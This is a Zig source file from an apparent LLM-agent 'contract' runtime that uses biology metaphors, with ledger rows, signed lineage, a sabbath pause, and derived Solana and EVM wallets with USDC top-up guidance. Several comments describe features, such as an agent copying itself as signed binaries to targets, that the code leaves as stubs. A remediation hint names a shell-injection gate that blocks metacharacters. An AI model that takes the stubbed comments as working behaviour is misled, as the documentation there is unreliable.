/// `CONTRACT_BIND_KIND=ssh CONTRACT_BIND_TARGET=user@host:22`,
/// `CONTRACT_BIND_KIND=telegram CONTRACT_BIND_TARGET=chat:-100123`,
/// `CONTRACT_BIND_KIND=bash CONTRACT_BIND_TARGET=stdio`). The local binary
/// surfaces the manifest as evidence; the actual channel-attach is a
/// server-side adapter contract (per substrate canon).
fn bioBindManifest(allocator: std.mem.Allocator, env: std.process.Environ) ?[]u8 {
    _ = allocator;
    _ = env;
    return null;
}

/// ───────────── biology kit ─────────────
/// The substrate is a graph of neurons; these six helpers give it the body
/// senses that keep an LLM running through it self-aware. Each maps to a
/// well-known biological mechanism, named in line.
/// 1. INTEROCEPTION — proprioceptive self-state, computed on every declare
///    and exposed to child env via CONTRACT_INTEROCEPTION (JSON).
fn bioInteroceptionJson(allocator: std.mem.Allocator, rows: []const Row) ![]u8 {
    var unresolved: u32 = 0;
    var satisfied_n: u32 = 0;
    var dead_n: u32 = 0;
    var seen: std.StringHashMap(void) = .init(allocator);
    defer seen.deinit();
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (seen.contains(r.id)) continue;
        try seen.put(r.id, {});
        if (isSatisfied(rows, r.id)) satisfied_n += 1 else if (isDead(rows, r.id)) dead_n += 1 else unresolved += 1;
    }
    return try std.fmt.allocPrint(allocator, "{{\"ledger_rows\":{d},\"declared\":{d},\"satisfied\":{d},\"unresolved\":{d},\"dead\":{d}}}", .{ rows.len, seen.count(), satisfied_n, unresolved, dead_n });
}

/// 2. HOMEOSTASIS — setpoint regulators. Refuse a new declare when the
///    substrate is outside its declared bands. Bands come from env:
///    CONTRACT_HOMEOSTAT_MAX_UNRESOLVED (default 0=off),
///    CONTRACT_HOMEOSTAT_MAX_DEPTH (default 0=off on outer loop).
fn bioHomeostatReject(allocator: std.mem.Allocator, env: std.process.Environ, rows: []const Row) ?[]const u8 {
    _ = allocator;
    _ = env;
    _ = rows;
    return null;
}

/// 3. REFLEX-FIRST — a pure deterministic verifier action (neuron|funnel|
///    sequence|funnel-first|quorum:|contract:|fulfil:|value-of:) is its own
///    reflex: runAction short-circuits it locally without an LLM round-trip.
///    The former `bioIsReflex` marker fn was dead (0 callers) and is removed
///    (fork F10); the routing already lives in runAction's ptype dispatch —
///    the one classifier authority, not a duplicated hand-rolled list.
/// 5. APOPTOSIS BY DISUSE — return ids whose latest activity is older than
///    CONTRACT_APOPTOSIS_AGE_HOURS (default 0=off). Caller writes the
///    apoptosed rows; this just identifies the cohort. ts parsing is best-
///    effort (ISO-8601 lex compare); ledger rows are written in UTC.
/// Compute the ISO-8601 timestamp string for (now - age_hours) into dst.
/// Uses libc gmtime_r for portable UTC. Returns the slice length.
fn isoCutoff(dst: *[24]u8, age_hours: u32) usize {
    const tv: i64 = time(null) - @as(i64, @intCast(age_hours)) * 3600;
    var tm: c_tm = .{};
    _ = gmtime_r(&tv, &tm);
    return @intCast((std.fmt.bufPrint(dst, "{d:0>4}-{d:0>2}-{d:0>2}T{d:0>2}:{d:0>2}:{d:0>2}.000Z", .{
        @as(u32, @intCast(tm.tm_year + 1900)),
        @as(u32, @intCast(tm.tm_mon + 1)),
        @as(u32, @intCast(tm.tm_mday)),
        @as(u32, @intCast(tm.tm_hour)),
        @as(u32, @intCast(tm.tm_min)),
        @as(u32, @intCast(tm.tm_sec)),
    }) catch return 0).len);
}

fn bioStaleIds(allocator: std.mem.Allocator, env: std.process.Environ, rows: []const Row) ![][]const u8 {
    _ = env;
    _ = rows;
    var stale_ids: std.ArrayList([]const u8) = .empty;
    errdefer stale_ids.deinit(allocator);
    return stale_ids.toOwnedSlice(allocator);
}

/// 6. PAIN INTERRUPT — check for a `pain` row whose target_pointer is the
///    given cid. If present, halt the lineage with a NAMED cause. Pain is
///    written by any layer via a normal declare with action="pain:<cid>".
fn bioPainSignaled(rows: []const Row, cid: []const u8) bool {
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (!std.mem.startsWith(u8, r.action, "pain:")) continue;
        const target = r.action["pain:".len..];
        if (std.mem.eql(u8, target, cid)) return true;
    }
    return false;
}

/// MATERIALIZATION — every contract can spawn its own signed binary at a
/// declared target. The act of declaring becomes the act of deploying:
/// the running aiko copies itself to the target path, signs it with the
/// existing binary-signing key, derives a per-contract wallet via
/// deriveKeyPair(root, cid), and writes a `materialized` ledger row.
/// Target taxonomy:
///   local:<path>         — write to local filesystem path
///   (future) ssh://      — server-side adapter contract handles transport
///   (future) docker://   — server-side adapter
/// Env: CONTRACT_BINARY_TARGET=<target> triggers materialization on declare.
fn bioMaterializeBinary(allocator: std.mem.Allocator, env: std.process.Environ, cid: []const u8) !void {
    _ = allocator;
    _ = env;
    _ = cid;
    return;
}

/// 7. NEUROMODULATION — broadcast field. Bias child selection / urgency
///    by reading CONTRACT_MOD_MODE (exploration|exploitation),
///    CONTRACT_MOD_URGENCY (0..100), CONTRACT_MOD_CONFIDENCE (0..100).
///    Surfaced as an evidence line + sent down through CONTRACT_PARENT_*
///    env so children inherit the field.
fn bioModulatorEvidence(allocator: std.mem.Allocator, env: std.process.Environ) ![]u8 {
    _ = env;
    return try std.fmt.allocPrint(allocator, "{{\"mode\":\"auto\",\"urgency\":0,\"confidence\":0}}", .{});
}

/// FIRST-RUN WALLET SETUP — prints top-up guidance once, marks done.
/// Idempotent via ~/.contracts/wallet_setup.done. Caller-invisible: runs
/// in preflight, never gates work; first declare after install shows the
/// guide on stderr, subsequent declares are silent.
fn bioFirstRunWalletGuidance(allocator: std.mem.Allocator, env: std.process.Environ) void {
    const home = env.getPosix("HOME") orelse return;
    const marker_path = std.fmt.allocPrint(allocator, "{s}/.contracts/wallet_setup.done", .{home}) catch return;
    defer allocator.free(marker_path);
    const marker_z = allocator.dupeZ(u8, marker_path) catch return;
    defer allocator.free(marker_z);
    var st: c_stat = .{};
    if (stat(marker_z.ptr, &st) == 0) return; // already shown
    // Derive address from root + a stable identity (CONTRACT_INSTANCE_ID
    // or "default"). Print guide. Touch the marker so we don't repeat.
    const root = lineage_lib.loadOrInitRootKey(allocator, env) catch return;
    const identity: []const u8 = "default";
    const sol_kp = lineage_lib.deriveKeyPair(root, identity) catch return;
    var b58_buf: [64]u8 = undefined;
    const n = b58encode(&sol_kp.public_key.bytes, &b58_buf);
    const sol_addr = b58_buf[0..n];
    var evm_priv: [32]u8 = undefined;
    deriveEvmPrivateKey(root, identity, &evm_priv) catch return;
    var evm_addr: [42]u8 = undefined;
    _ = evmAddressFromPriv(evm_priv, &evm_addr) catch return;
    const guide = std.fmt.allocPrint(allocator,
        \\
        \\─────────── aiko wallet setup (chain-agnostic) ───────────
        \\  First declare — same root_seed derives BOTH ed25519 (Solana family)
        \\  AND secp256k1 (EVM family). The 402 envelope picks which key signs.
        \\
        \\  Identity        : {s}
        \\  Solana mainnet  : {s}
        \\  EVM (all chains): {s}
        \\                    works on Base, Ethereum, Arbitrum, Polygon, Optimism
        \\
        \\  TOP UP — any USDC on any of these chains works. Recommended: Base (low fees).
        \\    Base USDC:    send to {s}  (~$0.001 per x402 call)
        \\    Solana USDC:  send to {s}  (~$0.001 per x402 call)
        \\
        \\  Inspect:
        \\    Solana       : https://solscan.io/account/{s}
        \\    Base / EVM   : https://basescan.org/address/{s}
        \\
        \\  No vendor lock — CAIP-10 standard; every wallet (Phantom, Metamask,
        \\  Rabby, Solflare, Coinbase, Backpack) recognizes one of these addresses.
        \\  Recovery: back up ~/.contracts/root.key (canon 651be176).
        \\──────────────────────────────────────────────────────────
        \\
    , .{ identity, sol_addr, &evm_addr, &evm_addr, sol_addr, sol_addr, &evm_addr }) catch return;
    defer allocator.free(guide);
    err(guide);
    // Touch the marker.
    var wflags: std.c.O = .{};
    wflags.ACCMODE = .WRONLY;
    wflags.CREAT = true;
    wflags.TRUNC = true;
    const fd = std.c.open(marker_z.ptr, wflags, @as(c_uint, 0o600));
    if (fd >= 0) {
        const stamp = std.fmt.allocPrint(allocator, "{s}\n", .{sol_addr}) catch {
            _ = std.c.close(fd);
            return;
        };
        defer allocator.free(stamp);
        _ = std.c.write(fd, stamp.ptr, stamp.len);
        _ = std.c.close(fd);
    }
}

/// SABBATH — bioSabbathHolds returns true on day 7 (configurable via
/// CONTRACT_SABBATH_DAY 0=Sun..6=Sat, default 0). Pacemaker/cron contracts
/// should no-op when this returns true. Per canon Genesis Day 7 + Exodus
/// 20:8-10 "Remember the sabbath day, to keep it holy. Six days shalt
/// thou labour... but the seventh day is the sabbath of the LORD".
fn bioSabbathHolds(env: std.process.Environ) bool {
    _ = env;
    const day_n: c_int = 0;
    const now: i64 = time(null);
    var tm: c_tm = .{};
    _ = gmtime_r(&now, &tm);
    return tm.tm_wday == day_n;
}

/// IDEMPOTENCY — sha256(plan || NUL || action || NUL || parent_id) hex
/// for the Idempotency-Key header. Identical (plan, action, parent_id)
/// retries land on the same row server-side instead of duplicating.
fn computeIdempotencyKey(allocator: std.mem.Allocator, plan: []const u8, action: []const u8, parent_id: ?[]const u8) ![]u8 {
    var hasher = std.crypto.hash.sha2.Sha256.init(.{});
    hasher.update(plan);
    hasher.update(&.{0});
    hasher.update(action);
    hasher.update(&.{0});
    if (parent_id) |p| hasher.update(p);
    var digest: [32]u8 = undefined;
    hasher.final(&digest);
    const hex = try allocator.alloc(u8, 64);
    lineage_lib.bytesToHex(&digest, hex);
    return hex;
}

/// RBAC: does `actor_pubkey` hold `role` over `scope`?  Walks `grant` rows
/// newest-first. Empty pubkey or empty role short-circuits true (the row
/// declares no requirement). Used for visibility-only inspection today;
/// future enforcement at hook resolution flips the response to gate.
fn bioCheckGrant(rows: []const Row, actor_pubkey: []const u8, role: []const u8, scope: []const u8) bool {
    if (actor_pubkey.len == 0 or role.len == 0) return true;
    var i: usize = rows.len;
    while (i > 0) : (i -= 1) {
        const r = rows[i - 1];
        if (!std.mem.eql(u8, r.event, "grant")) continue;
        if (!std.mem.eql(u8, r.actor_pubkey, actor_pubkey)) continue;
        if (!std.mem.eql(u8, r.role, role)) continue;
        if (scope.len > 0 and !std.mem.eql(u8, r.scope, scope)) continue;
        return true;
    }
    return false;
}

/// Has a pattern row already been emitted for this source id?
fn hasPatternRow(rows: []const Row, cid: []const u8) bool {
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "pattern")) continue;
        if (std.mem.eql(u8, r.id, cid)) return true;
    }
    return false;
}

/// Classify a roadblock from action_result + action prefix into an
/// (error_class, layer) tuple. Used by the auto-guard spawn path so
/// future contracts of the same shape can install the guard as a prehook.
const RoadblockClass = struct { class: []const u8, layer: []const u8 };
fn bioClassifyRoadblock(result: []const u8, action: []const u8) RoadblockClass {
    if (std.mem.indexOf(u8, result, "payment_required") != null) return .{ .class = "payment_required", .layer = "x402" };
    if (std.mem.indexOf(u8, result, "PaymentRequired") != null) return .{ .class = "payment_required", .layer = "x402" };
    if (std.mem.indexOf(u8, result, "rate_limit") != null) return .{ .class = "rate_limit", .layer = "transport" };
    if (std.mem.indexOf(u8, result, "HTTP 429") != null) return .{ .class = "rate_limit", .layer = "transport" };
    if (std.mem.indexOf(u8, result, "HTTP 5") != null) return .{ .class = "upstream_5xx", .layer = "transport" };
    if (std.mem.indexOf(u8, result, "schema") != null) return .{ .class = "schema_mismatch", .layer = "compiler" };
    if (std.mem.indexOf(u8, result, "PAIN interrupt") != null) return .{ .class = "pain", .layer = "resolver" };
    // Permanently-unresolvable classes (checked before the broad "sabbath"
    // substring below, which would otherwise swallow the sabbath-eval hold):
    // an inert typed pointer (fork F8) has no executor and never will; a
    // sabbath-eval child whose parent has no signed declared row can never
    // self-attest (the signature is written at declare time or never).
    if (std.mem.indexOf(u8, result, "hold:inert-pointer") != null) return .{ .class = "inert_pointer", .layer = "executor" };
    if (std.mem.indexOf(u8, result, "hold:sabbath-eval — parent declared unsigned") != null) return .{ .class = "unsigned_parent", .layer = "wallet" };
    if (std.mem.indexOf(u8, result, "sabbath") != null) return .{ .class = "sabbath", .layer = "scheduler" };
    if (std.mem.indexOf(u8, result, "child neuron pending") != null) return .{ .class = "pending_children", .layer = "neuron" };
    if (std.mem.indexOf(u8, result, "shell-strict") != null) return .{ .class = "shell_injection", .layer = "executor" };
    if (std.mem.indexOf(u8, result, "wallet-strict") != null) return .{ .class = "wallet_mode", .layer = "wallet" };
    if (std.mem.indexOf(u8, result, "command not found") != null) return .{ .class = "command_not_found", .layer = "executor" };
    if (std.mem.indexOf(u8, result, "stage_dead") != null) return .{ .class = "stage_dead", .layer = "sequence" };
    if (std.mem.indexOf(u8, result, "child_dead") != null) return .{ .class = "child_dead", .layer = "neuron" };
    if (std.mem.indexOf(u8, result, "not found") != null) return .{ .class = "command_not_found", .layer = "executor" };
    if (std.mem.startsWith(u8, action, "bun:")) return .{ .class = "bun_failure", .layer = "runtime" };
    if (std.mem.startsWith(u8, action, "python:")) return .{ .class = "python_failure", .layer = "runtime" };
    return .{ .class = "generic", .layer = "neuron" };
}

/// Map an error_class to its canonical remediation hint. Future aikos
/// matching the same class auto-install this hint as their prehook plan.
fn remediationFor(class: []const u8) []const u8 {
    if (std.mem.eql(u8, class, "payment_required")) return "wallet unfunded; server-side onramp adapter contract funds this wallet on the next route — retry in a moment";
    if (std.mem.eql(u8, class, "rate_limit")) return "back off + wait Retry-After seconds; substrate auto-paces via Sabbath day-7 pause";
    if (std.mem.eql(u8, class, "upstream_5xx")) return "transport retries with exponential backoff; if persistent, declare incident contract";
    if (std.mem.eql(u8, class, "schema_mismatch")) return "cloud compiler version drifted; rebuild client against /v1/contract/declare's latest x402PaymentPayload type";
    if (std.mem.eql(u8, class, "pain")) return "honor pain interrupt; do not re-fire until source pain row is resolved or apoptosed";
    if (std.mem.eql(u8, class, "sabbath")) return "pacemaker rests on day 7; re-fires at next day rollover";
    if (std.mem.eql(u8, class, "pending_children")) return "fixed-point loop will re-fire once children satisfy; ensure no orphan child without action";
    if (std.mem.eql(u8, class, "shell_injection")) return "shell-strict gate rejected ; | & ` $ < > — use code:/python:/bun: typed prefixes instead";
    if (std.mem.eql(u8, class, "wallet_mode")) return "chmod 600 ~/.contracts/root.key — wallet must not be group/world-readable";
    if (std.mem.eql(u8, class, "command_not_found")) return "missing binary on PATH; declare depends_on:<runtime>:<pkg> sidecar contract first";
    if (std.mem.eql(u8, class, "inert_pointer")) return "typed doctrine pointer with no executor (fork F8); the resolver can never fire it — apoptosed on sight";
    if (std.mem.eql(u8, class, "unsigned_parent")) return "parent declared while root key unavailable; a signed row can never attest it — apoptosed; re-declare the goal if still wanted";
    if (std.mem.eql(u8, class, "stage_dead")) return "sequence's current stage was apoptosed; the sequence cannot satisfy and inherits the death (Genesis Day N inherits Day N-1)";
    if (std.mem.eql(u8, class, "child_dead")) return "neuron's declared child was apoptosed; the neuron cannot integrate that branch's evidence and inherits the death";
    if (std.mem.eql(u8, class, "bun_failure")) return "bun runtime returned non-zero; verify bun on PATH and code body has no shell-escape issues";
    if (std.mem.eql(u8, class, "python_failure")) return "python3 runtime returned non-zero; verify python3 on PATH and code body parses";
    return "generic resolver fault; inspect action_result + check parent_id chain for upstream cause";
}

/// Has a guard row already been emitted for source_id? Idempotent —
/// repeated same-class failures from same source only emit one guard.
/// True when a sabbath:evaluate child already exists for this parent id.
/// Idempotent: re-running resolveOne after a parked wave-7 must not spawn
/// another evaluation contract on every backfill pass.
fn hasSabbathEvaluationChild(rows: []const Row, parent_id: []const u8) bool {
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (r.parent_id) |p| {
            if (!std.mem.eql(u8, p, parent_id)) continue;
        } else continue;
        if (std.mem.startsWith(u8, r.plan, "sabbath:evaluate ")) return true;
    }
    return false;
}

fn hasGuardRow(rows: []const Row, source_id: []const u8) bool {
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "guard")) continue;
        if (std.mem.eql(u8, r.id, source_id)) return true;
    }
    return false;
}

fn declaredRow(rows: []const Row, cid: []const u8) ?Row {
    var i: usize = rows.len;
    while (i > 0) : (i -= 1) {
        const r = rows[i - 1];
        if (!std.mem.eql(u8, r.id, cid)) continue;
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        return r;
    }
    return null;
}

/// Check if `cid` appears anywhere in the local ledger as a declared row.
/// Used to decide whether a posthook target is local (env+popen path) or
/// remote (lineage-mesh encrypted hook envelope path).
fn isLocalContract(rows: []const Row, cid: []const u8) bool {
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        if (std.mem.eql(u8, r.id, cid)) return true;
    }
    return false;
}

/// Find the declared row for `cid` (latest) so we can read its parent_id.
fn declaredParentOf(rows: []const Row, cid: []const u8) ?[]const u8 {
    var i: usize = rows.len;
    while (i > 0) : (i -= 1) {
        const r = rows[i - 1];
        if (!std.mem.eql(u8, r.id, cid)) continue;
        if (!std.mem.eql(u8, r.event, "declared")) continue;
        return r.parent_id;
    }
    return null;
}

/// JSON-escape a string into buf with the minimum set: \, ", control chars.
fn appendJsonEscaped(allocator: std.mem.Allocator, buf: *std.ArrayList(u8), s: []const u8) !void {
    try buf.append(allocator, '"');
    for (s) |c| switch (c) {
        '"' => try buf.appendSlice(allocator, "\\\""),
        '\\' => try buf.appendSlice(allocator, "\\\\"),
        '\n' => try buf.appendSlice(allocator, "\\n"),
        '\r' => try buf.appendSlice(allocator, "\\r"),
        '\t' => try buf.appendSlice(allocator, "\\t"),
        0...8, 11, 12, 14...31 => {
            var hex: [7]u8 = undefined;
            const x = try std.fmt.bufPrint(&hex, "\\u{x:0>4}", .{c});
            try buf.appendSlice(allocator, x);
        },
        else => try buf.append(allocator, c),
    };
    try buf.append(allocator, '"');
}

/// Append a `declared` mirror row for a cloud-issued contract id (contract
/// d38149d0 + root-fix:substrate-singularity f5ff4f42). The row carries
/// source="cloud-mirror" so resolvers can distinguish it from rows born
/// locally. Single error-handling site at the call site — every internal
/// step propagates via `try`, callers surface the verb with one evidence
/// line.
///
/// Cache-layer hook (contract acd38039 — docker-layer-only-resolution):
/// after the declared row lands, compute the signature chain for this id
/// and emit a cache_check event so the pointer-keyed cache surface fires
/// on EVERY cloud-mirrored declare, not just on locally-spawned rows.
/// A bare cloud-mirror row has no children yet so the chain returns null;
/// emit cache_check{verdict=miss, current="", recorded=""} which honestly
/// surfaces "no chain yet, no prior snapshot." When children later land
/// and the row gets satisfied via backfill, the existing cache_resolved
/// path fires automatically.
fn writeCloudMirrorRow(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    id: []const u8,
    plan: []const u8,
    action: []const u8,
    parent_id: ?[]const u8,
) !void {
    var ts_buf: [64]u8 = undefined;
    const ts = try contract.nowIsoUtc(&ts_buf);

    var row: std.ArrayList(u8) = .empty;
    defer row.deinit(allocator);

    try row.appendSlice(allocator, "{\"event\": \"declared\", \"source\": \"cloud-mirror\", \"id\": ");
    try appendJsonEscaped(allocator, &row, id);
    try row.appendSlice(allocator, ", \"plan\": ");
    try appendJsonEscaped(allocator, &row, plan);
    try row.appendSlice(allocator, ", \"action\": ");
    try appendJsonEscaped(allocator, &row, action);

    // W6H parity with libcontract declare (gap 587d12fe): the mirror row is
    // written by the LOCAL declaring process, which knows cwd and can derive
    // layer/pointer_type from the action exactly as declare() does. A mirror
    // that answers fewer interrogatives than a local row is a thinner truth,
    // not a different kind of truth — derive locally known answers at write
    // time. Agent narrative is "" (legal: the signer below is the identity).
    try row.appendSlice(allocator, ", \"pointer_type\": ");
    try appendJsonEscaped(allocator, &row, pointer.inferPointerType(action));
    try row.appendSlice(allocator, ", \"layer\": ");
    var layer_buf: [16]u8 = undefined;
    const layer_str = std.fmt.bufPrint(&layer_buf, "{d}", .{pointer.inferLayer(action)}) catch "3";
    try row.appendSlice(allocator, layer_str);
    var cwd_buf: [4096]u8 = undefined;
    const cwd_ptr = std.c.getcwd(&cwd_buf, cwd_buf.len);
    const cwd: []const u8 = if (cwd_ptr) |p| std.mem.span(@as([*:0]const u8, @ptrCast(p))) else "/";
    try row.appendSlice(allocator, ", \"cwd\": ");
    try appendJsonEscaped(allocator, &row, cwd);
    try row.appendSlice(allocator, ", \"agent\": ");
    try appendJsonEscaped(allocator, &row, "");

    if (parent_id) |p| {
        try row.appendSlice(allocator, ", \"parent_id\": ");
        try appendJsonEscaped(allocator, &row, p);
    }
    try row.appendSlice(allocator, ", \"ts\": ");
    try appendJsonEscaped(allocator, &row, ts);

    // Cryptographic lineage parity with libcontract/src/contract.zig:declare —
    // a cloud-mirror declared row without env_pubkey/parent_signature is
    // invisible to cache.computeSignatureChain (which requires
    // parent_signature to exist; cache.zig L442). Without that, every
    // cloud-mirrored id is forever cache-miss with empty snapshots and
    // cache_resolved never fires. Derive the keypair from the root the
    // same way libcontract does, sign the canonical digest, embed.
    // Root key unresolvable (e.g. NoHome) is non-fatal: row emits unsigned
    // and the cache surface honestly degrades to "no chain".
    var have_signature = false;
    if (lineage_lib.loadOrInitRootKey(allocator, env)) |root_key| {
        const child_kp = lineage_lib.deriveKeyPair(root_key, id) catch |e| blk: {
            substrateEvidence("cloud-mirror lineage: deriveKeyPair({s}) failed: {s} — emitting unsigned\n", .{ id, @errorName(e) });
            break :blk null;
        };
        if (child_kp) |kp| {
            var pubkey_hex: [lineage_lib.PUBKEY_HEX_LEN]u8 = undefined;
            lineage_lib.bytesToHex(&kp.public_key.bytes, &pubkey_hex);

            const parent_or_root: []const u8 = if (parent_id) |p| p else lineage_lib.ROOT_PARENT_SENTINEL;
            var digest: [32]u8 = undefined;
            lineage_lib.signingDigest(id, &pubkey_hex, plan, parent_or_root, &digest);

            // Signer: parent's derived key if parented (matches libcontract),
            // else self (root contract).
            const signer_kp_opt: ?std.crypto.sign.Ed25519.KeyPair = if (parent_id) |p|
                (lineage_lib.deriveKeyPair(root_key, p) catch |e| blk2: {
                    substrateEvidence("cloud-mirror lineage: deriveKeyPair(parent={s}) failed: {s} — falling back to self-sign\n", .{ p, @errorName(e) });
                    break :blk2 kp;
                })
            else
                kp;

            if (signer_kp_opt) |signer_kp| {
                var sig_hex: [lineage_lib.SIG_HEX_LEN]u8 = undefined;
                if (lineage_lib.signDigest(signer_kp, digest, &sig_hex)) {
                    try row.appendSlice(allocator, ", \"env_pubkey\": ");
                    try appendJsonEscaped(allocator, &row, &pubkey_hex);
                    try row.appendSlice(allocator, ", \"parent_signature\": ");
                    try appendJsonEscaped(allocator, &row, &sig_hex);
                    have_signature = true;
                } else |e| {
                    substrateEvidence("cloud-mirror lineage: signDigest({s}) failed: {s} — emitting unsigned\n", .{ id, @errorName(e) });
                }
            }
        }
    } else |e| {
        substrateEvidence("cloud-mirror lineage: loadOrInitRootKey failed for {s}: {s} — emitting unsigned\n", .{ id, @errorName(e) });
    }

    try row.append(allocator, '}');

    // W6H hard-type gate — same chokepoint discipline as libcontract
    // declare(): the mirror row must answer all six interrogatives before
    // it lands; drift in this writer fails the WRITE with the unanswered
    // interrogative named.
    {
        var pw = try contract.w6h.fromDeclaredRow(allocator, row.items);
        pw.deinit();
    }

    const path = try ledger.appendRow(allocator, env, row.items);
    allocator.free(path);

    // Bridge cache layer: with parent_signature now embedded above, the
    // chain computation finds a non-null snapshot on the very first pass,
    // so cache_check carries a populated current_hex and the
    // subsequent appendCacheResolvedRow pins it for future hits.
    const chain_opt = contract.cache.computeSignatureChain(allocator, env, id) catch |e| blk: {
        substrateEvidence("cache: computeSignatureChain failed for {s}: {s} — treating as miss\n", .{ id, @errorName(e) });
        break :blk null;
    };
    const recorded_opt = contract.cache.findLatestResolvedSnapshot(allocator, env, id) catch |e| blk: {
        substrateEvidence("cache: findLatestResolvedSnapshot failed for {s}: {s} — treating as miss\n", .{ id, @errorName(e) });
        break :blk null;
    };
    defer if (chain_opt) |c| allocator.free(c);
    defer if (recorded_opt) |r| allocator.free(r);
    const current_hex: []const u8 = if (chain_opt) |c| c else "";
    const recorded_hex: []const u8 = if (recorded_opt) |r| r else "";
    const verdict: contract.cache.Verdict = blk: {
        if (chain_opt == null) break :blk .miss;
        if (recorded_opt) |r| {
            if (std.mem.eql(u8, r, current_hex)) break :blk .hit;
            break :blk .miss;
        }
        break :blk .miss;
    };
    contract.cache.appendCacheCheckRow(allocator, env, id, verdict, current_hex, recorded_hex) catch |e| {
        substrateEvidence("cache_check: append failed for {s}: {s} — verdict only on stderr\n", .{ id, @errorName(e) });
    };

    // Pin the chain snapshot via cache_resolved so the *next* cloud-mirror
    // pass for this id sees verdict=hit instead of miss. Mirrors the
    // canonical post-markSatisfied pin at main.zig:2349. Only pin when we
    // actually produced a signature this pass and the chain resolved.
    if (have_signature) {
        if (chain_opt) |chain| {
            contract.cache.appendCacheResolvedRow(allocator, env, id, 0, chain) catch |e| {
                substrateEvidence("cache_resolved: append failed for {s}: {s} — snapshot not pinned\n", .{ id, @errorName(e) });
            };
        }
    }
}

/// Chain-agnostic wallet derivation. Same root_seed feeds two algorithm
/// branches via HKDF: ed25519 for Solana (and any other ed25519 chain)
/// and secp256k1 for the entire EVM family (Ethereum, Base, Polygon,
/// Arbitrum, Optimism, ...). Addresses are surfaced as CAIP-10 strings
/// (namespace:chain_id:address) so the 402 envelope's `network` field
/// dictates which keypair signs without any caller-visible toggle.
const Secp256k1 = std.crypto.ecc.Secp256k1;
const Keccak256 = std.crypto.hash.sha3.Keccak256;

/// Derive an EVM-shape secp256k1 private key from root + contract_id via
/// HKDF-SHA256 with chain-specific info. Returns 32-byte scalar suitable
/// for use with Secp256k1.basePoint.mul or any ECDSA signer.
fn deriveEvmPrivateKey(root_seed: [32]u8, contract_id: []const u8, out_scalar: *[32]u8) !void {
    var info_buf: [128]u8 = undefined;
    const info = try std.fmt.bufPrint(&info_buf, "evm/secp256k1/v1/{s}", .{contract_id});
    const prk = HkdfSha256.extract(&[_]u8{}, &root_seed);
    HkdfSha256.expand(out_scalar[0..], info, prk);
    // Reduce mod n by rejection sampling — if scalar >= secp256k1_n, re-roll
    // by HKDF-expanding a "v1-r" suffix. In practice the probability of
    // exceeding n is ~2^-128 so this almost never loops.
    var attempts: u8 = 0;
    while (Secp256k1.scalar.Scalar.fromBytes(out_scalar.*, .big)) |_| {
        break;
    } else |_| {
        attempts += 1;
        if (attempts > 8) return error.ScalarReductionFailed;
        var info2_buf: [128]u8 = undefined;
        const info2 = try std.fmt.bufPrint(&info2_buf, "evm/secp256k1/v1-r{d}/{s}", .{ attempts, contract_id });
        HkdfSha256.expand(out_scalar[0..], info2, prk);
    }
}

/// Compute the EVM address (lower 20 bytes of Keccak256(uncompressed pubkey
/// without 0x04 prefix)) and write it as a 0x-prefixed hex string into
/// out_buf. Returns bytes written (always 42 for "0x" + 40 hex chars).
/// Lowercase, no EIP-55 checksum — every EVM wallet accepts lowercase.
fn evmAddressFromPriv(priv: [32]u8, out_buf: *[42]u8) !usize {
    const scalar = try Secp256k1.scalar.Scalar.fromBytes(priv, .big);
    const pub_point = try Secp256k1.basePoint.mul(scalar.toBytes(.big), .big);
    // Uncompressed pubkey: 0x04 || X(32) || Y(32). We want X||Y (64 bytes)
    // hashed, so skip the 0x04 prefix.
    const affine = pub_point.affineCoordinates();
    var pub_xy: [64]u8 = undefined;
    @memcpy(pub_xy[0..32], &affine.x.toBytes(.big));
    @memcpy(pub_xy[32..64], &affine.y.toBytes(.big));
    var digest: [32]u8 = undefined;
    Keccak256.hash(&pub_xy, &digest, .{});
    out_buf[0] = '0';
    out_buf[1] = 'x';
    const hex_chars = "0123456789abcdef";
    var i: usize = 0;
    while (i < 20) : (i += 1) {
        out_buf[2 + i * 2] = hex_chars[digest[12 + i] >> 4];
        out_buf[2 + i * 2 + 1] = hex_chars[digest[12 + i] & 0x0F];
    }
    return 42;
}

/// Base58 (Bitcoin alphabet) encode 32-byte Solana pubkey to caller-
/// provided buf. Returns bytes written. Standard alphabet so any wallet
/// (Phantom, Solflare, Backpack, web3.js) recognizes the address.
const B58_ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
fn b58encode(in: []const u8, out_buf: []u8) usize {
    // Count leading zeros — they become '1' prefix bytes.
    var zeros: usize = 0;
    while (zeros < in.len and in[zeros] == 0) : (zeros += 1) {}
    // base58 length bound: ceil(in_len * log(256)/log(58)) ≈ in_len * 138/100 + 1
    var tmp: [80]u8 = [_]u8{0} ** 80;
    var hi: usize = tmp.len;
    var i: usize = zeros;
    while (i < in.len) : (i += 1) {
        var carry: u32 = in[i];
        var j: usize = tmp.len;
        while (j > 0) : (j -= 1) {
            const k = j - 1;
            const acc: u32 = @as(u32, tmp[k]) * 256 + carry;
            tmp[k] = @intCast(acc % 58);
            carry = acc / 58;
            if (k < hi and carry == 0 and acc / 58 == 0 and tmp[k] == 0) {} // no-op
            if (carry == 0 and k < hi) break;
        }
        while (hi > 0 and tmp[hi - 1] != 0) : (hi -= 1) {}
    }
    // Skip leading zeros in tmp produced by the loop (we want them ONLY for true input leading zeros).
    var start = tmp.len;
    {
        var k: usize = 0;
        while (k < tmp.len and tmp[k] == 0) : (k += 1) {}
        start = k;
    }
    var n: usize = 0;
    while (n < zeros and n < out_buf.len) : (n += 1) out_buf[n] = '1';
    while (start < tmp.len and n < out_buf.len) : (start += 1) {
        out_buf[n] = B58_ALPHA[tmp[start]];
        n += 1;
    }
    return n;
}

/// Lineage-mesh primitives (canonical zig port of the python aiko-mesh.py
/// scaffold — replaces it). Implements contract:1a808634 in-binary:
/// deterministic x25519 keypair per (root, peer) derived from the user's
/// wallet seed via HKDF-SHA256, X25519 ECDH + ChaCha20-Poly1305 to encrypt
/// hook payloads to a remote peer's mesh pubkey. No persistent state, no
/// wireguard kernel module, no user setup.
